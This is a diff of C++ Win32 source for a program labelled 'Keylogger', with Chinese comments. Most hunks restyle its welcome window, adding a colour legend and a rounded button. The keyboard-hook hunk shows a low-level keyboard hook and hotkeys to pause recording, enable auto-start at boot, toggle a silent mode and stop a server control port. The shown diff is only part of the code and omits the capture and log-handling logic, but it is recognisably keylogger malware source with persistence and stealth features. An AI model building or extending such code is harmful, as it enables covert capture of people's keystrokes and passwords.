@@ -385,7 +385,7 @@ LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
         DeleteObject(bgBrush);
         
         // 绘制标题栏
-        RECT headerRect = { 0, 0, rect.right, 60 };
+        RECT headerRect = { 0, 0, rect.right, 40 };
         HBRUSH titleBrush = CreateSolidBrush(RGB(255, 255, 255));
         FillRect(hdc, &headerRect, titleBrush);
         DeleteObject(titleBrush);
@@ -393,22 +393,22 @@ LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
         // 绘制标题栏边框
         HPEN borderPen = CreatePen(PS_SOLID, 1, RGB(229, 231, 235));
         HPEN oldPen = (HPEN)SelectObject(hdc, borderPen);
-        MoveToEx(hdc, 0, 60, NULL);
-        LineTo(hdc, rect.right, 60);
+        MoveToEx(hdc, 0, 40, NULL);
+        LineTo(hdc, rect.right, 40);
         SelectObject(hdc, oldPen);
         DeleteObject(borderPen);
         
         // 绘制标题文本
         SetBkMode(hdc, TRANSPARENT);
         SetTextColor(hdc, RGB(31, 41, 55));
-        HFONT titleFont = CreateFont(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
+        HFONT titleFont = CreateFont(22, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
         HFONT oldFont = (HFONT)SelectObject(hdc, titleFont);
         DrawTextW(hdc, L"Keylogger", -1, &headerRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
         SelectObject(hdc, oldFont);
         DeleteObject(titleFont);
         
         // 绘制内容区域
-        RECT contentRect = { 30, 90, rect.right - 30, rect.bottom - 90 };
+        RECT contentRect = { 20, 60, rect.right - 20, rect.bottom - 60 };
         SetTextColor(hdc, RGB(31, 41, 55));
         
         // 显示当前状态和快捷键说明
@@ -416,34 +416,34 @@ LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
         
         // 绘制状态信息
         SetTextColor(hdc, RGB(31, 41, 55));
-        HFONT statusFont = CreateFont(20, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
+        HFONT statusFont = CreateFont(18, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
         SelectObject(hdc, statusFont);
         std::wstring statusLine = L"当前状态: " + statusText;
-        RECT statusRect = { contentRect.left, contentRect.top, contentRect.right, contentRect.top + 40 };
+        RECT statusRect = { contentRect.left, contentRect.top, contentRect.right, contentRect.top + 35 };
         DrawTextW(hdc, statusLine.c_str(), -1, &statusRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
         DeleteObject(statusFont);
         
-        // 绘制快捷键说明（增大字体）
-        HFONT shortcutFont = CreateFont(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
+        // 绘制快捷键说明
+        HFONT shortcutFont = CreateFont(17, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
         SelectObject(hdc, shortcutFont);
         
         // 绘制快捷键说明标题
-        RECT shortcutRect = { contentRect.left, contentRect.top + 50, contentRect.right, contentRect.bottom };
+        RECT shortcutRect = { contentRect.left, contentRect.top + 40, contentRect.right, contentRect.bottom };
         SetTextColor(hdc, RGB(31, 41, 55));
         RECT titleRect = shortcutRect;
-        titleRect.bottom = titleRect.top + 30;
+        titleRect.bottom = titleRect.top + 25;
         DrawTextW(hdc, L"快捷键说明:", -1, &titleRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
         
         // 绘制快捷键列表
-        int lineHeight = 30;
+        int lineHeight = 25;
         int currentY = titleRect.bottom + 5;
         
         // 快捷键1
-        RECT keyRect = { shortcutRect.left, currentY, shortcutRect.left + 200, currentY + lineHeight };
+        RECT keyRect = { shortcutRect.left, currentY, shortcutRect.left + 180, currentY + lineHeight };
         SetTextColor(hdc, RGB(59, 130, 246)); // 蓝色
         DrawTextW(hdc, L"Ctrl + Shift + Alt + P", -1, &keyRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
         
-        RECT funcRect = { shortcutRect.left + 200, currentY, shortcutRect.right, currentY + lineHeight };
+        RECT funcRect = { shortcutRect.left + 180, currentY, shortcutRect.right, currentY + lineHeight };
         SetTextColor(hdc, RGB(31, 41, 55));
         DrawTextW(hdc, L"暂停/继续录制", -1, &funcRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
         currentY += lineHeight;
@@ -482,7 +482,7 @@ LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
         funcRect.bottom = currentY + lineHeight;
         SetTextColor(hdc, RGB(31, 41, 55));
         DrawTextW(hdc, L"启用/禁用静默模式", -1, &funcRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
-        currentY += lineHeight + 10;
+        currentY += lineHeight + 5;
         
         // 绘制日志保存位置
         RECT logRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
@@ -495,12 +495,88 @@ LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
         SetTextColor(hdc, RGB(16, 185, 129)); // 绿色
         std::wstring portText = L"服务器控制端口: " + std::to_wstring(g_localPort);
         DrawTextW(hdc, portText.c_str(), -1, &portRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        currentY += lineHeight + 5;
+        
+        // 绘制色块显示功能说明
+        RECT colorRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
+        SetTextColor(hdc, RGB(31, 41, 55));
+        DrawTextW(hdc, L"色块显示功能:", -1, &colorRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        currentY += lineHeight;
+        
+        // 绘制颜色对应意义
+        int colorBoxSize = 12;
+        int colorBoxMargin = 5;
+        
+        // 绿色 - 继续录制
+        RECT greenRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
+        SetTextColor(hdc, RGB(31, 41, 55));
+        RECT greenBoxRect = { greenRect.left, greenRect.top + (lineHeight - colorBoxSize) / 2, greenRect.left + colorBoxSize, greenRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
+        HBRUSH greenBrush = CreateSolidBrush(RGB(0, 255, 0));
+        FillRect(hdc, &greenBoxRect, greenBrush);
+        DeleteObject(greenBrush);
+        RECT greenTextRect = { greenBoxRect.right + colorBoxMargin, greenRect.top, greenRect.right, greenRect.bottom };
+        DrawTextW(hdc, L"绿色 - 继续录制", -1, &greenTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        currentY += lineHeight;
+        
+        // 红色 - 暂停/停止录制或错误
+        RECT redRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
+        SetTextColor(hdc, RGB(31, 41, 55));
+        RECT redBoxRect = { redRect.left, redRect.top + (lineHeight - colorBoxSize) / 2, redRect.left + colorBoxSize, redRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
+        HBRUSH redBrush = CreateSolidBrush(RGB(255, 0, 0));
+        FillRect(hdc, &redBoxRect, redBrush);
+        DeleteObject(redBrush);
+        RECT redTextRect = { redBoxRect.right + colorBoxMargin, redRect.top, redRect.right, redRect.bottom };
+        DrawTextW(hdc, L"红色 - 暂停/停止录制或错误", -1, &redTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        currentY += lineHeight;
+        
+        // 蓝色 - 启用开机自启
+        RECT blueRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
+        SetTextColor(hdc, RGB(31, 41, 55));
+        RECT blueBoxRect = { blueRect.left, blueRect.top + (lineHeight - colorBoxSize) / 2, blueRect.left + colorBoxSize, blueRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
+        HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 255));
+        FillRect(hdc, &blueBoxRect, blueBrush);
+        DeleteObject(blueBrush);
+        RECT blueTextRect = { blueBoxRect.right + colorBoxMargin, blueRect.top, blueRect.right, blueRect.bottom };
+        DrawTextW(hdc, L"蓝色 - 启用开机自启", -1, &blueTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        currentY += lineHeight;
+        
+        // 浅蓝色 - 禁用开机自启
+        RECT lightBlueRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
+        SetTextColor(hdc, RGB(31, 41, 55));
+        RECT lightBlueBoxRect = { lightBlueRect.left, lightBlueRect.top + (lineHeight - colorBoxSize) / 2, lightBlueRect.left + colorBoxSize, lightBlueRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
+        HBRUSH lightBlueBrush = CreateSolidBrush(RGB(0, 128, 255));
+        FillRect(hdc, &lightBlueBoxRect, lightBlueBrush);
+        DeleteObject(lightBlueBrush);
+        RECT lightBlueTextRect = { lightBlueBoxRect.right + colorBoxMargin, lightBlueRect.top, lightBlueRect.right, lightBlueRect.bottom };
+        DrawTextW(hdc, L"浅蓝色 - 禁用开机自启", -1, &lightBlueTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        currentY += lineHeight;
+        
+        // 黄色 - 启用静默模式
+        RECT yellowRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
+        SetTextColor(hdc, RGB(31, 41, 55));
+        RECT yellowBoxRect = { yellowRect.left, yellowRect.top + (lineHeight - colorBoxSize) / 2, yellowRect.left + colorBoxSize, yellowRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
+        HBRUSH yellowBrush = CreateSolidBrush(RGB(255, 255, 0));
+        FillRect(hdc, &yellowBoxRect, yellowBrush);
+        DeleteObject(yellowBrush);
+        RECT yellowTextRect = { yellowBoxRect.right + colorBoxMargin, yellowRect.top, yellowRect.right, yellowRect.bottom };
+        DrawTextW(hdc, L"黄色 - 启用静默模式", -1, &yellowTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        currentY += lineHeight;
+        
+        // 橙色 - 禁用静默模式
+        RECT orangeRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
+        SetTextColor(hdc, RGB(31, 41, 55));
+        RECT orangeBoxRect = { orangeRect.left, orangeRect.top + (lineHeight - colorBoxSize) / 2, orangeRect.left + colorBoxSize, orangeRect.top + (lineHeight - colorBoxSize) / 2 + colorBoxSize };
+        HBRUSH orangeBrush = CreateSolidBrush(RGB(255, 192, 0));
+        FillRect(hdc, &orangeBoxRect, orangeBrush);
+        DeleteObject(orangeBrush);
+        RECT orangeTextRect = { orangeBoxRect.right + colorBoxMargin, orangeRect.top, orangeRect.right, orangeRect.bottom };
+        DrawTextW(hdc, L"橙色 - 禁用静默模式", -1, &orangeTextRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
         
         SelectObject(hdc, oldFont);
         DeleteObject(shortcutFont);
         
-        // 绘制关闭按钮
-        RECT buttonRect = { rect.right - 150, rect.bottom - 60, rect.right - 30, rect.bottom - 20 };
+        // 绘制确定按钮
+        RECT buttonRect = { rect.right - 120, rect.bottom - 45, rect.right - 20, rect.bottom - 15 };
         
         // 检查鼠标是否在按钮上
         POINT pt = g_mousePos;
@@ -510,33 +586,50 @@ LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
             isHover = PtInRect(&buttonRect, pt);
         }
         
-        // 绘制按钮背景
+        // 绘制按钮背景（带圆角）
         HBRUSH buttonBrush;
         if (g_isButtonPressed)
         {
-            buttonBrush = CreateSolidBrush(RGB(191, 219, 254)); // 浅蓝色
+            buttonBrush = CreateSolidBrush(RGB(209, 213, 219)); // 中灰色
         }
         else if (isHover)
         {
-            buttonBrush = CreateSolidBrush(RGB(209, 213, 219)); // 浅灰色
+            buttonBrush = CreateSolidBrush(RGB(231, 241, 255)); // 浅蓝色背景
         }
         else
         {
-            buttonBrush = CreateSolidBrush(RGB(229, 231, 235)); // 更浅的灰色
+            buttonBrush = CreateSolidBrush(RGB(255, 255, 255)); // 白色背景
         }
+        
+        // 创建圆角路径
+        HRGN buttonRgn = CreateRoundRectRgn(buttonRect.left, buttonRect.top, buttonRect.right, buttonRect.bottom, 10, 10);
+        SelectClipRgn(hdc, buttonRgn);
         FillRect(hdc, &buttonRect, buttonBrush);
+        DeleteObject(buttonRgn);
         DeleteObject(buttonBrush);
         
-        // 绘制按钮边框
-        HPEN buttonPen = CreatePen(PS_SOLID, 1, RGB(229, 231, 235));
+        // 绘制按钮边框（带圆角）
+        HPEN buttonPen;
+        if (g_isButtonPressed)
+        {
+            buttonPen = CreatePen(PS_SOLID, 2, RGB(191, 219, 254)); // 浅蓝色边框
+        }
+        else if (isHover)
+        {
+            buttonPen = CreatePen(PS_SOLID, 2, RGB(59, 130, 246)); // 蓝色边框
+        }
+        else
+        {
+            buttonPen = CreatePen(PS_SOLID, 1, RGB(229, 231, 235)); // 浅灰色边框
+        }
         SelectObject(hdc, buttonPen);
-        Rectangle(hdc, buttonRect.left, buttonRect.top, buttonRect.right, buttonRect.bottom);
+        RoundRect(hdc, buttonRect.left, buttonRect.top, buttonRect.right, buttonRect.bottom, 10, 10);
         SelectObject(hdc, oldPen);
         DeleteObject(buttonPen);
         
         // 绘制按钮文本
-        SetTextColor(hdc, RGB(31, 41, 55));
-        HFONT buttonFont = CreateFont(16, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
+        SetTextColor(hdc, RGB(31, 41, 55)); // 深色文本
+        HFONT buttonFont = CreateFont(18, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
         SelectObject(hdc, buttonFont);
         DrawTextW(hdc, L"确定", -1, &buttonRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
         SelectObject(hdc, oldFont);
@@ -554,7 +647,7 @@ LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
         // 检查鼠标是否在按钮上
         RECT rect;
         GetClientRect(hWnd, &rect);
-        RECT buttonRect = { rect.right - 150, rect.bottom - 60, rect.right - 30, rect.bottom - 20 };
+        RECT buttonRect = { rect.right - 120, rect.bottom - 45, rect.right - 20, rect.bottom - 15 };
         
         bool isHover = PtInRect(&buttonRect, pt);
         POINT oldPos = g_mousePos;
@@ -593,7 +686,7 @@ LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
             g_mousePos = { -1, -1 };
             RECT rect;
             GetClientRect(hWnd, &rect);
-            RECT buttonRect = { rect.right - 150, rect.bottom - 60, rect.right - 30, rect.bottom - 20 };
+            RECT buttonRect = { rect.right - 120, rect.bottom - 45, rect.right - 20, rect.bottom - 15 };
             InvalidateRect(hWnd, &buttonRect, FALSE);
         }
         return 0;
@@ -606,10 +699,10 @@ LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
         
         RECT rect;
         GetClientRect(hWnd, &rect);
-        RECT buttonRect = { rect.right - 150, rect.bottom - 60, rect.right - 30, rect.bottom - 20 };
+        RECT buttonRect = { rect.right - 120, rect.bottom - 45, rect.right - 20, rect.bottom - 15 };
         
         // 检查是否点击了标题栏区域
-        RECT titleBarRect = { 0, 0, rect.right, 60 };
+        RECT titleBarRect = { 0, 0, rect.right, 40 };
         if (PtInRect(&titleBarRect, pt) && !PtInRect(&buttonRect, pt))
         {
             // 开始拖动窗口
@@ -633,7 +726,7 @@ LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
         
         RECT rect;
         GetClientRect(hWnd, &rect);
-        RECT buttonRect = { rect.right - 150, rect.bottom - 60, rect.right - 30, rect.bottom - 20 };
+        RECT buttonRect = { rect.right - 120, rect.bottom - 45, rect.right - 20, rect.bottom - 15 };
         
         // 结束拖动
         if (g_isDragging)
@@ -690,8 +783,8 @@ void ShowWelcomeWindow()
         return;
     }
     
-    int width = 550;
-    int height = 450;
+    int width = 480;
+    int height = 480;
     int x = (GetSystemMetrics(SM_CXSCREEN) - width) / 2;
     int y = (GetSystemMetrics(SM_CYSCREEN) - height) / 2;
     
@@ -1601,7 +1694,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
         {
             kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
-            if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            if (kbdStruct.vkCode == 'P' && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000))
             {
                 isRecording = !isRecording;
                 // 保存录制状态到注册表
@@ -1618,23 +1711,9 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                     ShowTransparentSquare(g_hNotifyWnd, RGB(255, 0, 0)); // 红色 - 暂停录制
                 }
             }
-            else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            else if (kbdStruct.vkCode == 'Q' && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000))
             {
-                ShowTransparentSquare(g_hNotifyWnd, RGB(255, 0, 0)); // 红色 - 停止录制
                 std::cout << "Recording stopped\n";
-                
-                // 处理窗口消息，让动画有时间播放
-                MSG msg;
-                int startTime = GetTickCount();
-                while (GetTickCount() - startTime < 1500) // 增加时间，确保动画完成
-                {
-                    if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
-                    {
-                        TranslateMessage(&msg);
-                        DispatchMessage(&msg);
-                    }
-                    Sleep(1); // 减少睡眠时间，确保消息被及时处理
-                }
                 
                 StopServerControl();
                 CleanupNotifyIcon();
@@ -1642,11 +1721,13 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                 output_file.close();
                 exit(0);
             }
-            else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            else if (kbdStruct.vkCode == 'S' && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000))
             {
                 bool enabled = IsAutoStartEnabled();
+                std::cout << "Current auto-start: " << enabled << std::endl;
                 if (SetAutoStart(!enabled))
                 {
+                    std::cout << "Auto-start toggled to: " << !enabled << std::endl;
                     if (!enabled)
                         ShowTransparentSquare(g_hNotifyWnd, RGB(0, 0, 255)); // 蓝色 - 启用开机自启
                     else
@@ -1654,14 +1735,17 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                 }
                 else
                 {
+                    std::cout << "Failed to toggle auto-start" << std::endl;
                     ShowTransparentSquare(g_hNotifyWnd, RGB(255, 0, 0)); // 红色 - 错误
                 }
             }
-            else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            else if (kbdStruct.vkCode == 'D' && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000))
             {
                 bool silent = IsSilentMode();
+                std::cout << "Current silent mode: " << silent << std::endl;
                 if (SetSilentMode(!silent))
                 {
+                    std::cout << "Silent mode toggled to: " << !silent << std::endl;
                     if (!silent)
                         ShowTransparentSquare(g_hNotifyWnd, RGB(255, 255, 0)); // 黄色 - 启用静默模式
                     else
@@ -1669,6 +1753,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                 }
                 else
                 {
+                    std::cout << "Failed to toggle silent mode" << std::endl;
                     ShowTransparentSquare(g_hNotifyWnd, RGB(255, 0, 0)); // 红色 - 错误
                 }
             }
